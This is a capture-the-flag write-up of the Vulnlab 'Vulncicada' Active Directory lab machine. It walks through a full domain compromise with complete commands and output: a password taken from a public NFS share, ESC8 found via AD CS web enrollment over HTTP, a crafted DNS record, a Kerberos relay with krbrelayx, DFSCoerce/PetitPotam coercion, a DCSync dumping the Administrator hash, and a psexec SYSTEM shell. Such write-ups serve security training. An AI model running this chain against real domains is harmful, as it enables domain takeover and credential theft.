# Introduction


<p align="center">
  <img src="img/Badge.png" alt="Description de l'image" width="300"/>
</p>

**Vulncicada** is a medium-rated Active Directory machine from **xct** on the **Vulnlab** platform, designed to model a realistic domain compromise scenario. This write-up details the full attack path from a black-box perspective.

The initial foothold is gained from a password found in a public NFS share. This access is then leveraged to exploit a critical **ESC8** vulnerability in Active Directory Certificate Services (AD CS). The final compromise is achieved through a **Kerberos relay attack** targeting the insecure HTTP web enrollment interface, leading to a complete takeover of the Domain Controller.
# Walktrough
## Enumerating services

I start by enumerating services on the host with the **nmap** tool.

```bash
$ nmap -sCV -T5 -oA nmap 10.129.234.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-08 02:15 CDT
Nmap scan report for 10.129.234.48
Host is up (0.074s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 07:15:33Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-08T06:57:08
|_Not valid after:  2026-10-08T06:57:08
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-08T06:57:08
|_Not valid after:  2026-10-08T06:57:08
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-08T06:57:08
|_Not valid after:  2026-10-08T06:57:08
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-10-08T06:57:08
|_Not valid after:  2026-10-08T06:57:08
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-10-07T07:04:45
|_Not valid after:  2026-04-08T07:04:45
|_ssl-date: 2025-10-08T07:16:56+00:00; 0s from scanner time.
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-08T07:16:17
|_  start_date: N/A
```

This Windows Machine is a domain controller as there are kerberos and LDAP services.
An intereseting NFS share is also present and it is possible to connect to this host with winRM.
The domain name `cicada.vl` and the DC FQDN is  `DC-JPQ225.cicada.vl`.
I add these information in `/etc/hosts`.

```bash
# echo '10.129.234.48 cicada.vl DC-JPQ225.cicada.vl DC-JPQ225' >> /etc/hosts
```
## Discovering a password in a public NFS share

Let's check if there is public NFS share.

```bash
┌─[eu-dedivip-2]─[10.10.14.131]─[m3ringue@htb-ywpgsjp8ux]─[~]
└──╼ [★]$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)
```

The share `/profiles` is available to everyone.
I mount the share on my attacking machine.

```bash
$ sudo mkdir /mnt/vulncicada

$ sudo mount 10.129.234.48:/profiles /mnt/vulncicada
```

What do we have here ?

```bash
$ ll
total 5.5K
drwxrwxrwx 2 nobody nogroup 64 Sep 15  2024 Administrator
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Debra.Wright
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Jane.Carter
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Jordan.Francis
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Katie.Ward
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Megan.Simpson
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx 2 nobody nogroup 64 Sep 15  2024 Rosie.Powell
drwxrwxrwx 2 nobody nogroup 64 Sep 13  2024 Shirley.West
```

There is a picture in the Administrator folder.

![](img/Administrator.png)

Also in the Rosie.Powell's folder.

![](img/Marketing.png)

It look likes Rosie can't remember her password. 
I try this password with the `rosie.powell` account. 

```bash
# nxc winrm DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123'   
[16:31:48] ERROR    Invalid NTLM challenge received from server. This may indicate winrm.py:62
                    NTLM is not supported and nxc winrm only support NTLM                     
                    currently                                                                 
WINRM       10.129.234.48   5985   DC-JPQ225.cicada.vl [*] None (name:DC-JPQ225.cicada.vl) (domain:None) (NTLM:False)
WINRM       10.129.234.48   5985   DC-JPQ225.cicada.vl [-] None\rosie.powell:Cicada123
```

NTLM is deactivaded in this domain, so I use Kerberos authentication just by adding the `-k` parameter and it worked.

```bash
# nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
```

`rosie.powell:Cicada123`
## Enumerating and discovering an ESC8 vulnerability

With this account, I can enumerate the SMB shares.

```bash
# nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
```

Nothing interesting here but I see that there his an ADCS service in this domain.
I use the **certipy** tool to enumerate ADCS but before this I need to request a TGT for the authentication.

```bash
# getTGT.py "cicada.vl"/"rosie.powell":'Cicada123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rosie.powell.ccache
```

I set the KRB5CCNAME to the `rosie.powell` ccache and ask **certipy** to find vulnerable certificate template.

```bash
# KRB5CCNAME=rosie.powell.ccache certipy find -vulnerable -u 'rosie.powell' -p 'Cicada123' -target DC-JPQ225.cicada.vl -k -stdout 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 56B178B5DC5711B648773DDA739F0921
    Certificate Validity Start          : 2025-10-15 17:36:42+00:00
    Certificate Validity End            : 2525-10-15 17:46:42+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

There is an ESC8 vulnerability as Web Enrollment is enabled over http.

## Abusing ESC8 to recover the DC certificate

It took me a lot of time to understand the mecanism to do a kerberos relay using an ESC8 vulnerability as I never did a NTLMrelay attack before.

Reading this Synaktyv [resource](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) helped me a lot.
The objectiv here is to put a fake entry in the DNS records of the DC that point to our attacking machine and coerce the DC to make a request toward this entry. The DC request is then relayed toward the Web Enrollment service and this service return the DC certificate to the attacking machine. Any domain user can put DNS entry inside an Active Directory envinronment.

I did many attempt untill find the good one. I was wrong at the beginning because my malicious DNS record was not well constructed.
The request must be in this form:
`[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`.
So in my context, the record has to be:
`DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`

As explained, I add the malicious DNS record using the `rosie.powell` account with a kerberos authentication.

```bash
# KRB5CCNAME=rosie.powell.ccache dnstool.py -u "cicada.vl\\rosie.powell" -p Cicada123 -r 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' -k -d 10.10.14.169 -a add DC-JPQ225.cicada.vl --tcp -dns-ip 10.129.234.48
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

I set up the krbrelay pointing to the ADCS HTTP service endpoint.

```
# krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs -v 'DC-JPQ225$' --template DomainController
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

And the coerce a DC authentication with Petitpotam. Notice that I don't put my machine IP but the fake DNS record which point to my machine;

```
# KRB5CCNAME=rosie.powell.ccache petitpotam.py -d "cicada.vl" "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" "DC-JPQ225.cicada.vl" -k

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:DC-JPQ225.cicada.vl[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
Something went wrong, check error status => Bind context rejected: invalid_checksum
```

That does not worked, I don't know why PetitPotam return me an invalid_checksum error after a successful bind.
I will try to coerce with NetExec.

```bash
# nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -M coerce_plus -o LISTENER='DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

And I receive back the DC certificate (I deleted the useless noise).

```bash
[*] SMBD: Received connection from 10.129.234.48
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 88
[*] Writing PKCS#12 certificate to ./DC-JPQ225$.pfx
[*] Certificate successfully written to file
```

## Performing a DCSync with the DC account

I can now authenticate as DC-JPQ225 using this certificate to recover his hash.

```bash
# certipy auth -pfx DC-JPQ225\$.pfx -dc-ip 10.129.234.48            
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

With the DC machine account, I can perform a DCSync attack over the domain.
I use NetExec for that with a Kerberos authentication.

```bash
# nxc smb DC-JPQ225.cicada.vl -u 'DC-JPQ225' -H 'a65952c664e9cf5de60195626edbeee3' -k --ntds 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\DC-JPQ225:a65952c664e9cf5de60195626edbeee3
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

The `administrator` hash is dumped.
`administrator:85a0da53871a9d56b6cd05deda3a5e87`

## Connecting to the DC as Administrator

As NTLM is disabled, I will need the `administrator` TGT first

```bash
# getTGT.py "cicada.vl"/"administrator" -hashes ':85a0da53871a9d56b6cd05deda3a5e87'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

Then I connect with Psexec using this TGT.

```
# KRB5CCNAME=administrator.ccache psexec.py "cicada.vl"/"administrator"@"DC-JPQ225.cicada.vl" -k 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file dcbCnGRI.exe
[*] Opening SVCManager on DC-JPQ225.cicada.vl.....
[*] Creating service LIII on DC-JPQ225.cicada.vl.....
[*] Starting service LIII.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

I am now connected as `nt authority\system` on the DC.
